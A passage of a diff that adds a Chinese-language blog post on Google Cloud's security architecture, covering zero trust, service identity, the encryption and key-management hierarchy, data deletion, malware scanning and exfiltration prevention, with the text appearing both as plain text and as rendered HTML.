+•    在共享操作系统的工作负载之间进行隔离，使得某项服务在被破解的情况下也不会影响同一主机上运行的其他工作负载的安全性。这样可以限制潜在的破解“影响范围”。
+
+基础架构设计为多租户。
+1. 服务身份标识、完整性与隔离为了实现服务间通信，应用使用加密的身份验证和授权。身份验证和授权以管理员和服务可以理解的抽象级别和粒度提供强大的访问权限控制。
+服务不依赖内部网络分段或防火墙作为主要安全机制。
+在基础架构上运行的每个服务都具有关联的服务帐号身份标识。安全政策可确保客户端与预期服务器通信，并且服务器限制特定客户端可以访问的方法和数据。
+使用各种隔离和沙盒技术来保护服务免受同一机器上运行的其他服务的影响。这些技术包括 Linux 用户分离、基于语言（如 Sandboxed API）和基于内核的沙盒、容器应用内核（如 gVisor）和硬件虚拟化。为风险较高的工作负载使用更多的隔离层。
+为了提高安全性，敏感服务（例如集群编排服务和某些密钥管理服务）只在专用机器上运行。
+2. 服务间访问管理服务的所有者可以利用基础架构提供的访问管理功能来精确指定其服务可以与其他哪些服务进行通信。
+可以将服务配置为根据身份标识允许或拒绝访问。所有这些身份标识（机器、服务和员工）都位于基础架构维护的全局命名空间中。
+为管理这些身份标识，基础架构提供了一个工作流系统，其中包括批准链、日志记录和通知。
+基础架构还为服务提供用户、群组和成员资格管理的规范化服务，可以在必要时实现精细的自定义访问权限控制。
+3. 服务间通信的加密基础架构可确保网络上的 RPC 数据的机密性和完整性。
+所有 Google Cloud 虚拟网络流量均经过加密。基础架构服务之间的所有通信都经过身份验证，大多数服务间通信均已加密，这增加了一层额外的安全保护，即使网络被窃听或网络设备遭到破解，也能保护通信。
+基础架构可自动、高效地（借助硬件分流）为数据中心之间通过网络传输的基础架构 RPC 流量提供端到端加密。
+4. Google Workspace 中的最终用户数据访问管理基础架构提供了一项中央用户身份识别服务，该服务可以颁发上述最终用户权限票证。
+身份识别服务验证最终用户登录，然后向用户的设备颁发用户凭据，例如 Cookie 或 OAuth 令牌。从该设备发送到的基础架构的每个后续请求都必须提供该最终用户凭据。
+当某个服务收到最终用户凭据时，会将该凭据传递给身份识别服务进行验证。如果最终用户凭据通过验证，身份识别服务会返回一个短期有效的最终用户权限票证，该票证可用于与该用户的请求相关的 RPC。
+基础架构可提供服务身份、自动身份互验、服务间通信加密，并可执行服务所有者定义的访问政策。每项服务都有一个由服务所有者创建的服务配置。对于加密的服务间通信，自动双向身份验证使用调用方和被调用方身份标识。只有在访问规则配置允许的情况下才能进行通信。
+
+四、安全的数据使用/存储Google 安全策略的核心是身份验证、完整性和加密，对于静态数据和传输中的数据均适用。
+Google 采用多种安全措施来确保传输过程中数据的真实性、完整性和私密性。
+•    身份验证：会验证数据源、人员或过程以及目标位置。
+•    完整性：确保您发送的数据会原封不动地到达目的地。
+•    加密：使数据在传输过程中无法识别，以保持其私密性。
+
+加密可用于保护三种状态的数据：
+•    静态加密通过加密存储的数据，防止数据受到系统入侵或数据渗漏的危害。
+•    传输加密：当数据在网站与云服务商之间或在两个服务之间移动时，如果通信遭到拦截，则可保护数据。
+•    使用中加密：通过加密处理中的数据（例如机密计算），保护内存中的数据免遭入侵或数据渗漏。
+
+1. 静态加密Google 的基础架构提供各种存储服务和分布式文件系统（例如 Spanner 和 Colossus）以及一个中央密钥管理服务。
+Google 的应用使用存储基础架构访问物理存储。默认情况下，存储基础架构会在用户数据写入物理存储空间之前加密所有用户数据。使用高级加密标准 (AES) 算法对静态存储的数据进行加密。
+基础架构在应用层或存储基础架构层执行加密。加密可使基础架构将其自身与底层存储上的潜在威胁（例如恶意磁盘固件）隔离开来。
+
+Cloud Storage 加密机制的具体运作方式：
+•    会将数据分割为多个子文件块进行存储；每个块的大小可以达到数个 GB。每个块使用单独的加密密钥在存储层级进行加密，两个块不会共用同一个加密密钥。
+•    如果数据块发生更新，系统会使用新密钥对其进行加密，而不是重复使用现有密钥。
+•    每个数据块都有一个唯一标识符。访问控制列表 (ACL) 确保每个块只能由已获授权的角色使用 Google 服务进行解密，并且授权角色仅会在解密那一刻获得访问权限。
+•    每个块都分布在 Google 的存储系统中，并以加密形式进行复制，以便于备份和灾难恢复。
+
+
+除了存储系统级加密外，大多数情况下数据还会在存储设备级加密。
+Google 的备份系统可确保数据在整个备份过程中保持加密状态。备份系统还使用专属的 DEK 对每个备份文件进行独立加密。
+
+
+用于对块中的数据进行加密的密钥称为 DEK（数据加密密钥）。由于 Google 的密钥很多，且需要提供低延迟、高可用性的服务，因此这些密钥都存储在用其加密的数据附近。DEK 本身又使用 KEK（密钥加密密钥）进行加密（也称为“封装”）。每项 Google Cloud 服务都有一个或多个 KEK。这些 KEK 集中存储在 Google 的 KMS 中，这是一个专为存储密钥而构建的存储区。只需少量 KEK（少于 DEK 的数量）并使用集中式密钥管理服务，就能轻松管理整个 Google 中的数据存储和加密，同时还可以集中跟踪和控制对数据的访问。系统会将每位 Google Cloud 客户的所有非共享资源拆分为多个数据块，并使用客户专属的密钥进行加密。即使是同一位客户所拥有的同一部分数据，保护其各块的 DEK 也各不相同。 更多细节：https://cloud.google.com/docs/security/encryption/default-encryption?hl=zh-cn#key_management
+
+
+Google 的 KMS 受到名为“KMS 主密钥”的根密钥保护，该密钥会封装 KMS 中的所有 KEK。它本身存储在另一个名为“Root KMS”的 KMS 中。Root KMS 也有自己的根密钥，称为“根 KMS 主密钥”。
+•    对数据进行分块并使用 DEK 进行加密。
+•    DEK 使用 KEK 进行加密。
+•    KEK 存储在 KMS 中。
+•    KMS 在全球数据中心的多台机器上运行。
+•    KMS 密钥使用 KMS 主密钥进行封装，而 KMS 主密钥存储在 Root KMS 中。
+•    Root KMS 中的密钥数量远少于 KMS 中的数量，并且仅在每个数据中心内的专用机器上运行。
+•    Root KMS 密钥使用根 KMS 主密钥进行封装，后者存储在根 KMS 主密钥分发服务器中。
+•    根 KMS 主密钥分发服务器是一个点对点基础架构，在全球各地专用机器的 RAM 中并发运行；每个分发服务器实例都会从其他正在运行的实例获取其密钥材料。
+•    如果所有分发服务器实例都关闭（全球性关闭），有存储在（不同的）安全硬件中的主密钥，这些安全硬件存放在有限的几个 Google 地点的（实体）保险箱中。
+
+
+除了基础架构进行的加密以外，Google Cloud 和 Google Workspace 还提供密钥管理服务。
+高可用性、低延迟、密钥全球访问在每个层级都至关重要；只有具备这些特性，才能在整个 Google 范围内使用 KMS。
+2.数据删除客户发出删除请求时，客户数据删除操作就会开始。通常，删除请求会指向特定资源、Google Cloud 项目或客户的 Google 帐号。删除请求的处理方式可能会有所不同，具体取决于客户请求的范围。
+数据删除流程通常是从将具体数据标记为“已安排删除”开始，而不是真正的删除数据。借助此方法，可以恢复无意间删除的数据，例如由客户发起的删除、bug 导致的删除或内部流程错误导致的删除。数据标记为“已安排删除”后，系统会根据特定于服务的政策来删除数据。
+当最终用户删除其帐号时，基础架构会通知处理最终用户数据的服务该帐号已被删除。然后，这些服务便会安排删除与被删除的最终用户帐号相关联的数据。此功能使最终用户能够控制自己的数据。
+
+删除流程细节参考：https://cloud.google.com/docs/security/deletion?hl=zh-cn#deletion_timeline
+3.保护使用中的数据/传输加密机密计算通过在加密隔离中执行计算来保护正在使用的数据，并在多租户云环境中维护工作负载的机密性。
+这种类型的加密隔离环境有助于防止在使用应用或数据时对应用和数据进行未经授权的访问或修改。
+可信执行环境还可增强管理敏感数据和受监管数据的组织的安全保障。
+Google 使用各种加密方法（包括默认方法和用户可配置的方法）加密传输中的数据。使用的加密类型取决于 OSI 层、服务类型和基础架构的物理组件。
+实现细节参考：https://cloud.google.com/docs/security/encryption-in-transit?hl=zh-cn#how_google_helps_the_internet_encrypt_data_in_transit
+下图展示了 Google Cloud 为第 3、4 和 7 层配置的可选和默认保护措施，以及第 3 层和第 4 层的默认保护措施和各种选项。
+
+
+4.Cloud KMS通过 Cloud KMS，Google 可专注于提供可扩缩、可靠且高性能的解决方案，在使用方便的平台上提供最广泛的可控制选项。
+Cloud KMS 的设计有五大重点：
+•    客户控制。借助 Cloud KMS，可以管理软件和硬件加密密钥，也可以提供自己的密钥。
+•    访问权限控制和监控。借助 Cloud KMS，可以分别管理各个密钥的权限，并监控这些密钥的使用方式。
+•    区域性。Cloud KMS 提供开箱即用的区域化功能。该服务配置为仅在所选的 Google Cloud 区域中创建、存储和处理软件密钥。
+•    耐用性。Cloud KMS 符合 Google Cloud 的最高耐用性标准。为了帮助防止数据损坏并验证数据能否成功解密，Cloud KMS 会定期扫描并备份所有密钥材料和元数据。
+•    安全性。Cloud KMS 提供强大的保护功能，以防密钥遭到未经授权的访问，并且已与 Identity and Access Management (IAM) 和 Cloud Audit Logs 控件完全集成。
+
+Cloud KMS白皮书和实现细节参考：https://cloud.google.com/docs/security/key-management-deep-dive?hl=zh-cn
+
+4. 对上传到 Cloud Storage 的文档进行自动恶意软件扫描流水线中的步骤：
+•    将文件上传到 Cloud Storage。
+•    上传事件会自动触发恶意软件扫描服务。
+•    恶意软件扫描工具服务会扫描上传的文档是否包含恶意软件。
+•    如果文档受感染，则服务会将其移到隔离的存储分区；否则，该文档会被移到另一个存储分区以存放未受感染的已扫描文档。
+
+
+5.数据丢失导致的泄漏享受公有云基础架构带来的灵活性、成本节约和功能时还需要提高警惕，并采用新方法保护数据免遭外泄。
+细节参考：https://cloud.google.com/docs/security/data-loss-prevention/preventing-data-exfiltration?hl=zh-cn
+•    通过数据分区最小化数据外泄事件的“爆炸半径”。
+•    在系统管理员工作流程中创建冗余和批准以加强问责制。
+•    使用精细配置的权限并仅将敏感数据的访问权限授予有相应工作职能需要的员工。
+•    使用日志记录提高组织中数据访问和移动的透明度。
+•    使用联网规则、identity and access management (IAM) 以及堡垒主机限制和监控组织中的机器的入站和出站。
+•    创建数据流的正常基准（例如可访问或传输的数据量）和用于比较异常行为的访问的地理位置。
+
+五、安全的互联网通信服务间通信的安全性不依赖于网络安全。但是，将基础架构从互联网隔离到专用 IP 地址空间。只将部分机器直接暴露给外部互联网流量，从而可以实现额外的保护，例如防御拒绝服务 (DoS) 攻击。
+1. Google Front End 服务当某个服务需要在互联网上可用时，它可向名为 Google Front End (GFE) 的基础架构服务注册。
+2. DoS防护当光纤骨干网向其中一个数据中心传送外部连接时，该连接会经过多层硬件和软件负载均衡器。这些负载均衡器会将有关入站流量的信息报告给在基础架构上运行的中央 DoS 服务。当中央 DoS 服务检测到 DoS 攻击时，该服务可以配置负载均衡器，以降低或限制与攻击相关的流量。
+3. 用户身份验证在 DoS 防护之后，安全通信的下一层防御来自中央身份识别服务。
+用户登录时，他们可以使用第二重身份验证，例如动态密码或防钓鱼安全密钥（例如 Titan 安全密钥）。
+相关技术细节参考：https://cloud.google.com/docs/authentication?hl=zh-cnhttps://cloud.google.com/docs/authentication/use-cases?hl=zh-cn
+六、安全运营1.安全的软件开发源代码控制保护机制和双方审核流程安全库和安全框架自动化安全扫描工具人工安全审核漏洞奖励计划安全问题研究(P0)
+2.源代码保护源代码存储在具有内置源完整性和治理的代码库中，可以在其中审核服务的当前版本和过去版本。
+基础架构要求服务的二进制文件基于经过审核、登记和测试的特定源代码构建。
+Binary Authorization for Borg (BAB) 是部署服务时进行的内部强制执行检查。供应链完整性可确保处理数据的服务的底层代码和二进制文件得到验证，并且通过证明测试。
+•    确保 Google 上部署的生产软件和配置经过审核和授权，尤其是在代码可以访问用户数据时。
+•    确保代码和配置部署满足特定的最低标准。
+•    防止内部人员或攻击者恶意修改源代码，并实现从服务回溯到其源代码的取证跟踪。
+
+实现细节参看：https://cloud.google.com/docs/security/binary-authorization-for-borg?hl=zh-cn
+如果怀疑任何凭据已遭到泄露，必须立即采取措施来限制其 Google Cloud 帐号的影响。确保用户的SOC 拥有快速响应可疑凭据泄露事件所需的策略方案、工具和访问权限。
+将您的凭据与源代码分开管理和存储。不小心将凭据和源代码都推送到 GitHub 等源代码管理站点这种情况极其常见，这会使您的凭据容易遭到攻击。使用 Secret Manager 和 Hashicorp Vault 等密文管理解决方案来存储密文，定期进行轮替，并应用最小权限。
+3.确保员工设备及凭据的安全实施保护措施，使员工的设备和凭据免遭破解。强制使用与 U2F 兼容的安全密钥来取代动态密码双重身份验证。
+监控员工用于运行基础架构的客户端设备。
+使用零信任安全性来保护员工对资源的访问。
+4. 降低来自内部人员的风险限制并主动监控拥有基础架构管理员权限的员工的活动。
+Google 员工对最终用户信息的访问情况可通过底层基础架构钩子进行记录。安全团队会监控访问模式并调查异常事件。
+5.威胁监控Google 的威胁分析小组会监控威胁发起者及其策略和技术的演变。
+6.入侵检测使用复杂的数据处理流水线来集成各个设备上基于主机的信号、来自基础架构中各个监控点的基于网络的信号，以及来自基础架构服务的信号。构建于这些流水线之上的规则和机器智能会向运营安全工程师发出潜在突发事件警告。
+7.应急响应每个数据突发事件都具有特异性，数据突发事件响应流程的目标是保护客户的数据，尽快恢复正常服务，并满足监管和合同合规要求。 Google 的突发事件响应计划的流程如下：
+
+七、支持合规性要求Google Cloud 会定期接受安全性、隐私权和合规控制措施方面的独立验证，并接收认证、证明和审核报告以证明合规。
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="一、责任共担模型和基础架构安全"><a href="#一、责任共担模型和基础架构安全" class="headerlink" title="一、责任共担模型和基础架构安全"></a>一、责任共担模型和基础架构安全</h2><p>云提供商始终负责底层网络和基础架构，并且客户始终负责其访问政策和数据。</p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p>Google 基础架构安全层详细参考：<a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RJn5O5Gh-PJyt-1K2ivM8A">https://mp.weixin.qq.com/s/RJn5O5Gh-PJyt-1K2ivM8A<i class="fas fa-external-link-alt"></i></a> (从位于底层的硬件基础架构安全性开始，到位于顶层的运营安全性。)</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<h2 id="二、安全的底层基础架构"><a href="#二、安全的底层基础架构" class="headerlink" title="二、安全的底层基础架构"></a>二、安全的底层基础架构</h2><h3 id="1-安全启动栈和机器身份标识"><a href="#1-安全启动栈和机器身份标识" class="headerlink" title="1. 安全启动栈和机器身份标识"></a>1. 安全启动栈和机器身份标识</h3><p>服务器利用以下技术确保启动正确的软件栈，启动链的硬件信任根如下：</p>
+<pre><code>•    The Titan hardware chip
+•    A lockable firmware chip
+•    A microcontroller running our own security code
+</code></pre>
+<p>通过自动化任务维护服务安全基线：</p>
+<pre><code>•    确保服务器运行其软件栈的最新版本（包括安全补丁）。
+•    检测和诊断硬件和软件问题。
+•    使用启动时验证和隐式证明确保机器和外围设备的完整性。
+•    确保只有运行指定软件和固件的机器才能访问使其可在生产网络中进行通信的凭据。
+•    当不再需要机器时，在服务中移除或重新分配机器。
+</code></pre>
+<h2 id="三、安全的服务部署"><a href="#三、安全的服务部署" class="headerlink" title="三、安全的服务部署"></a>三、安全的服务部署</h2><p>集群编排服务（Borg）控制直接在基础架构上运行的服务。</p>
+<p>“零信任安全模型”：基础架构假定基础架构上运行的服务之间不存在任何信任。无论是位于网络内部还是外部，默认情况下不信任任何设备或用户。</p>
+<p>BeyondCorp 认为“用户信任应该取决于设备的上下文感知状态等特征，而不是连接到公司网络的权限”；BeyondProd 认为“服务信任应该取决于代码出处和服务身份等特征，而不是生产网络中的位置（例如 IP 地址或主机名身份）”。</p>
+<p>下图对比了传统基础架构安全性方面与云原生架构中的安全性方面。更多细节参考：<a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/security/beyondprod?hl=zh-cn">https://cloud.google.com/docs/security/beyondprod?hl=zh-cn<i class="fas fa-external-link-alt"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>在开发云原生架构时的安全原则：</p>
+<pre><code>•    在边缘保护网络，以便将工作负载与来自互联网的网络攻击和未经授权的流量隔离开来。虽然基于防火墙的方法不是云原生架构的新概念，但仍然是安全性的最佳做法。在云原生世界中，边界方法用于保护尽可能多的基础架构，使其避开来自互联网的未经授权的流量和潜在的攻击，例如基于卷的拒绝服务攻击。
+
+•    服务之间没有固有的相互信任，只有已知的、受信任的、明确授权的调用者才能使用服务。这样可以阻止攻击者使用不可信代码访问服务。如果某个服务受到破解，这一原则可阻止攻击者执行扩大其攻击范围的操作。这种“互不信任”的机制有助于限制危害的范围。
+
+•    运行具有已知出处的代码的受信任机器，以便服务身份只能使用经过授权的代码和配置，并且只能在经过验证的授权环境中运行。
+
+•    用于跨服务强制执行一致政策的关卡。例如，一个用于验证访问用户数据的请求的关卡，以确保服务的访问来自于获得授权的最终用户发出且经过验证的请求，并且管理员的访问需要提供正当的理由。
+
+•    简单、自动化、标准化的更改发布，以便相关人员轻松审核基础架构更改对安全性的影响，并且可以在几乎不影响生产环境的情况下发布安全补丁程序。
+
+•    在共享操作系统的工作负载之间进行隔离，使得某项服务在被破解的情况下也不会影响同一主机上运行的其他工作负载的安全性。这样可以限制潜在的破解“影响范围”。
+</code></pre>
+<p>基础架构设计为多租户。</p>
+<h3 id="1-服务身份标识、完整性与隔离"><a href="#1-服务身份标识、完整性与隔离" class="headerlink" title="1. 服务身份标识、完整性与隔离"></a>1. 服务身份标识、完整性与隔离</h3><p>为了实现服务间通信，应用使用加密的身份验证和授权。身份验证和授权以管理员和服务可以理解的抽象级别和粒度提供强大的访问权限控制。</p>
+<p>服务不依赖内部网络分段或防火墙作为主要安全机制。</p>
+<p>在基础架构上运行的每个服务都具有关联的服务帐号身份标识。安全政策可确保客户端与预期服务器通信，并且服务器限制特定客户端可以访问的方法和数据。</p>
+<p>使用各种隔离和沙盒技术来保护服务免受同一机器上运行的其他服务的影响。这些技术包括 Linux 用户分离、基于语言（如 Sandboxed API）和基于内核的沙盒、容器应用内核（如 gVisor）和硬件虚拟化。为风险较高的工作负载使用更多的隔离层。</p>
+<p>为了提高安全性，敏感服务（例如集群编排服务和某些密钥管理服务）只在专用机器上运行。</p>
+<h3 id="2-服务间访问管理"><a href="#2-服务间访问管理" class="headerlink" title="2. 服务间访问管理"></a>2. 服务间访问管理</h3><p>服务的所有者可以利用基础架构提供的访问管理功能来精确指定其服务可以与其他哪些服务进行通信。</p>
+<p>可以将服务配置为根据身份标识允许或拒绝访问。所有这些身份标识（机器、服务和员工）都位于基础架构维护的全局命名空间中。</p>
+<p>为管理这些身份标识，基础架构提供了一个工作流系统，其中包括批准链、日志记录和通知。</p>
+<p>基础架构还为服务提供用户、群组和成员资格管理的规范化服务，可以在必要时实现精细的自定义访问权限控制。</p>
+<h3 id="3-服务间通信的加密"><a href="#3-服务间通信的加密" class="headerlink" title="3. 服务间通信的加密"></a>3. 服务间通信的加密</h3><p>基础架构可确保网络上的 RPC 数据的机密性和完整性。</p>
+<p>所有 Google Cloud 虚拟网络流量均经过加密。基础架构服务之间的所有通信都经过身份验证，大多数服务间通信均已加密，这增加了一层额外的安全保护，即使网络被窃听或网络设备遭到破解，也能保护通信。</p>
+<p>基础架构可自动、高效地（借助硬件分流）为数据中心之间通过网络传输的基础架构 RPC 流量提供端到端加密。</p>
+<h3 id="4-Google-Workspace-中的最终用户数据访问管理"><a href="#4-Google-Workspace-中的最终用户数据访问管理" class="headerlink" title="4. Google Workspace 中的最终用户数据访问管理"></a>4. Google Workspace 中的最终用户数据访问管理</h3><p>基础架构提供了一项中央用户身份识别服务，该服务可以颁发上述最终用户权限票证。</p>
+<p>身份识别服务验证最终用户登录，然后向用户的设备颁发用户凭据，例如 Cookie 或 OAuth 令牌。从该设备发送到的基础架构的每个后续请求都必须提供该最终用户凭据。</p>
+<p>当某个服务收到最终用户凭据时，会将该凭据传递给身份识别服务进行验证。如果最终用户凭据通过验证，身份识别服务会返回一个短期有效的最终用户权限票证，该票证可用于与该用户的请求相关的 RPC。</p>
+<p>基础架构可提供服务身份、自动身份互验、服务间通信加密，并可执行服务所有者定义的访问政策。每项服务都有一个由服务所有者创建的服务配置。对于加密的服务间通信，自动双向身份验证使用调用方和被调用方身份标识。只有在访问规则配置允许的情况下才能进行通信。</p>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<h2 id="四、安全的数据使用-存储"><a href="#四、安全的数据使用-存储" class="headerlink" title="四、安全的数据使用/存储"></a>四、安全的数据使用/存储</h2><p>Google 安全策略的核心是身份验证、完整性和加密，对于静态数据和传输中的数据均适用。</p>
+<p>Google 采用多种安全措施来确保传输过程中数据的真实性、完整性和私密性。</p>
+<pre><code>•    身份验证：会验证数据源、人员或过程以及目标位置。
+•    完整性：确保您发送的数据会原封不动地到达目的地。
+•    加密：使数据在传输过程中无法识别，以保持其私密性。
+</code></pre>
+<p>加密可用于保护三种状态的数据：</p>
+<pre><code>•    静态加密通过加密存储的数据，防止数据受到系统入侵或数据渗漏的危害。
+•    传输加密：当数据在网站与云服务商之间或在两个服务之间移动时，如果通信遭到拦截，则可保护数据。
+•    使用中加密：通过加密处理中的数据（例如机密计算），保护内存中的数据免遭入侵或数据渗漏。
+</code></pre>
+<h3 id="1-静态加密"><a href="#1-静态加密" class="headerlink" title="1. 静态加密"></a>1. 静态加密</h3><p>Google 的基础架构提供各种存储服务和分布式文件系统（例如 Spanner 和 Colossus）以及一个中央密钥管理服务。</p>
+<p>Google 的应用使用存储基础架构访问物理存储。默认情况下，存储基础架构会在用户数据写入物理存储空间之前加密所有用户数据。使用高级加密标准 (AES) 算法对静态存储的数据进行加密。</p>
+<p>基础架构在应用层或存储基础架构层执行加密。加密可使基础架构将其自身与底层存储上的潜在威胁（例如恶意磁盘固件）隔离开来。</p>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+<p>Cloud Storage 加密机制的具体运作方式：</p>
+<pre><code>•    会将数据分割为多个子文件块进行存储；每个块的大小可以达到数个 GB。每个块使用单独的加密密钥在存储层级进行加密，两个块不会共用同一个加密密钥。
+•    如果数据块发生更新，系统会使用新密钥对其进行加密，而不是重复使用现有密钥。
+•    每个数据块都有一个唯一标识符。访问控制列表 (ACL) 确保每个块只能由已获授权的角色使用 Google 服务进行解密，并且授权角色仅会在解密那一刻获得访问权限。
+•    每个块都分布在 Google 的存储系统中，并以加密形式进行复制，以便于备份和灾难恢复。
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="6.png"></p>
+<p>除了存储系统级加密外，大多数情况下数据还会在存储设备级加密。</p>
+<p>Google 的备份系统可确保数据在整个备份过程中保持加密状态。备份系统还使用专属的 DEK 对每个备份文件进行独立加密。</p>
+<blockquote>
+<blockquote>
+<p>用于对块中的数据进行加密的密钥称为 DEK（数据加密密钥）。由于 Google 的密钥很多，且需要提供低延迟、高可用性的服务，因此这些密钥都存储在用其加密的数据附近。DEK 本身又使用 KEK（密钥加密密钥）进行加密（也称为“封装”）。每项 Google Cloud 服务都有一个或多个 KEK。这些 KEK 集中存储在 Google 的 KMS 中，这是一个专为存储密钥而构建的存储区。只需少量 KEK（少于 DEK 的数量）并使用集中式密钥管理服务，就能轻松管理整个 Google 中的数据存储和加密，同时还可以集中跟踪和控制对数据的访问。系统会将每位 Google Cloud 客户的所有非共享资源拆分为多个数据块，并使用客户专属的密钥进行加密。即使是同一位客户所拥有的同一部分数据，保护其各块的 DEK 也各不相同。 更多细节：<a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/security/encryption/default-encryption?hl=zh-cn#key_management">https://cloud.google.com/docs/security/encryption/default-encryption?hl=zh-cn#key_management<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+</blockquote>
+<p>Google 的 KMS 受到名为“KMS 主密钥”的根密钥保护，该密钥会封装 KMS 中的所有 KEK。它本身存储在另一个名为“Root KMS”的 KMS 中。Root KMS 也有自己的根密钥，称为“根 KMS 主密钥”。</p>
+<pre><code>•    对数据进行分块并使用 DEK 进行加密。
+•    DEK 使用 KEK 进行加密。
+•    KEK 存储在 KMS 中。
+•    KMS 在全球数据中心的多台机器上运行。
+•    KMS 密钥使用 KMS 主密钥进行封装，而 KMS 主密钥存储在 Root KMS 中。
+•    Root KMS 中的密钥数量远少于 KMS 中的数量，并且仅在每个数据中心内的专用机器上运行。
+•    Root KMS 密钥使用根 KMS 主密钥进行封装，后者存储在根 KMS 主密钥分发服务器中。
+•    根 KMS 主密钥分发服务器是一个点对点基础架构，在全球各地专用机器的 RAM 中并发运行；每个分发服务器实例都会从其他正在运行的实例获取其密钥材料。
+•    如果所有分发服务器实例都关闭（全球性关闭），有存储在（不同的）安全硬件中的主密钥，这些安全硬件存放在有限的几个 Google 地点的（实体）保险箱中。
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="7.png"></p>
+<p>除了基础架构进行的加密以外，Google Cloud 和 Google Workspace 还提供密钥管理服务。</p>
+<p>高可用性、低延迟、密钥全球访问在每个层级都至关重要；只有具备这些特性，才能在整个 Google 范围内使用 KMS。</p>
+<h3 id="2-数据删除"><a href="#2-数据删除" class="headerlink" title="2.数据删除"></a>2.数据删除</h3><p>客户发出删除请求时，客户数据删除操作就会开始。通常，删除请求会指向特定资源、Google Cloud 项目或客户的 Google 帐号。删除请求的处理方式可能会有所不同，具体取决于客户请求的范围。</p>
+<p>数据删除流程通常是从将具体数据标记为“已安排删除”开始，而不是真正的删除数据。借助此方法，可以恢复无意间删除的数据，例如由客户发起的删除、bug 导致的删除或内部流程错误导致的删除。数据标记为“已安排删除”后，系统会根据特定于服务的政策来删除数据。</p>
+<p>当最终用户删除其帐号时，基础架构会通知处理最终用户数据的服务该帐号已被删除。然后，这些服务便会安排删除与被删除的最终用户帐号相关联的数据。此功能使最终用户能够控制自己的数据。</p>
+<p><img lazyload src="/images/loading.svg" data-src="8.png"></p>
+<p>删除流程细节参考：<a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/security/deletion?hl=zh-cn#deletion_timeline">https://cloud.google.com/docs/security/deletion?hl=zh-cn#deletion_timeline<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="3-保护使用中的数据-传输加密"><a href="#3-保护使用中的数据-传输加密" class="headerlink" title="3.保护使用中的数据/传输加密"></a>3.保护使用中的数据/传输加密</h3><p>机密计算通过在加密隔离中执行计算来保护正在使用的数据，并在多租户云环境中维护工作负载的机密性。</p>
+<p>这种类型的加密隔离环境有助于防止在使用应用或数据时对应用和数据进行未经授权的访问或修改。</p>
+<p>可信执行环境还可增强管理敏感数据和受监管数据的组织的安全保障。</p>
+<p>Google 使用各种加密方法（包括默认方法和用户可配置的方法）加密传输中的数据。使用的加密类型取决于 OSI 层、服务类型和基础架构的物理组件。</p>
+<p>实现细节参考：<a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/security/encryption-in-transit?hl=zh-cn#how_google_helps_the_internet_encrypt_data_in_transit">https://cloud.google.com/docs/security/encryption-in-transit?hl=zh-cn#how_google_helps_the_internet_encrypt_data_in_transit<i class="fas fa-external-link-alt"></i></a></p>
+<p>下图展示了 Google Cloud 为第 3、4 和 7 层配置的可选和默认保护措施，以及第 3 层和第 4 层的默认保护措施和各种选项。</p>
+<p><img lazyload src="/images/loading.svg" data-src="9.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="10.png"></p>
+<h3 id="4-Cloud-KMS"><a href="#4-Cloud-KMS" class="headerlink" title="4.Cloud KMS"></a>4.Cloud KMS</h3><p>通过 Cloud KMS，Google 可专注于提供可扩缩、可靠且高性能的解决方案，在使用方便的平台上提供最广泛的可控制选项。</p>
+<p>Cloud KMS 的设计有五大重点：</p>
+<pre><code>•    客户控制。借助 Cloud KMS，可以管理软件和硬件加密密钥，也可以提供自己的密钥。
+•    访问权限控制和监控。借助 Cloud KMS，可以分别管理各个密钥的权限，并监控这些密钥的使用方式。
+•    区域性。Cloud KMS 提供开箱即用的区域化功能。该服务配置为仅在所选的 Google Cloud 区域中创建、存储和处理软件密钥。
+•    耐用性。Cloud KMS 符合 Google Cloud 的最高耐用性标准。为了帮助防止数据损坏并验证数据能否成功解密，Cloud KMS 会定期扫描并备份所有密钥材料和元数据。
+•    安全性。Cloud KMS 提供强大的保护功能，以防密钥遭到未经授权的访问，并且已与 Identity and Access Management (IAM) 和 Cloud Audit Logs 控件完全集成。
+</code></pre>
+<p>Cloud KMS白皮书和实现细节参考：<a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/security/key-management-deep-dive?hl=zh-cn">https://cloud.google.com/docs/security/key-management-deep-dive?hl=zh-cn<i class="fas fa-external-link-alt"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="11.png"></p>
+<h3 id="4-对上传到-Cloud-Storage-的文档进行自动恶意软件扫描"><a href="#4-对上传到-Cloud-Storage-的文档进行自动恶意软件扫描" class="headerlink" title="4. 对上传到 Cloud Storage 的文档进行自动恶意软件扫描"></a>4. 对上传到 Cloud Storage 的文档进行自动恶意软件扫描</h3><p>流水线中的步骤：</p>
+<pre><code>•    将文件上传到 Cloud Storage。
+•    上传事件会自动触发恶意软件扫描服务。
+•    恶意软件扫描工具服务会扫描上传的文档是否包含恶意软件。
+•    如果文档受感染，则服务会将其移到隔离的存储分区；否则，该文档会被移到另一个存储分区以存放未受感染的已扫描文档。
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="12.png"></p>
+<h3 id="5-数据丢失导致的泄漏"><a href="#5-数据丢失导致的泄漏" class="headerlink" title="5.数据丢失导致的泄漏"></a>5.数据丢失导致的泄漏</h3><p>享受公有云基础架构带来的灵活性、成本节约和功能时还需要提高警惕，并采用新方法保护数据免遭外泄。</p>
+<p>细节参考：<a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/security/data-loss-prevention/preventing-data-exfiltration?hl=zh-cn">https://cloud.google.com/docs/security/data-loss-prevention/preventing-data-exfiltration?hl=zh-cn<i class="fas fa-external-link-alt"></i></a></p>
+<pre><code>•    通过数据分区最小化数据外泄事件的“爆炸半径”。
